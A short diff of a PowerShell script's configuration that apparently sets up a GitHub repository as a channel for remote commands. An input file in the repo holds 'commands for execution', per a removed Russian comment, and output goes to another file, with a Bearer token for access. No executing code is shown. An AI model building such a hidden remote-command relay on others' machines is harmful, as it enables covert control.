@@ -1,8 +1,8 @@
 $owner  = "your-username"
 $repo   = "your-repo"
-$branch = "main"  # <- убедись, что такая ветка есть
+$branch = "main"  
 $pathOut = "logs/OutCmd.txt"
-$pathIn  = "logs/GetCmd.txt"  # <- сюда ты будешь загружать команды для выполнения
+$pathIn  = "logs/GetCmd.txt"
 
 $headers = @{
     Authorization = "Bearer $token"
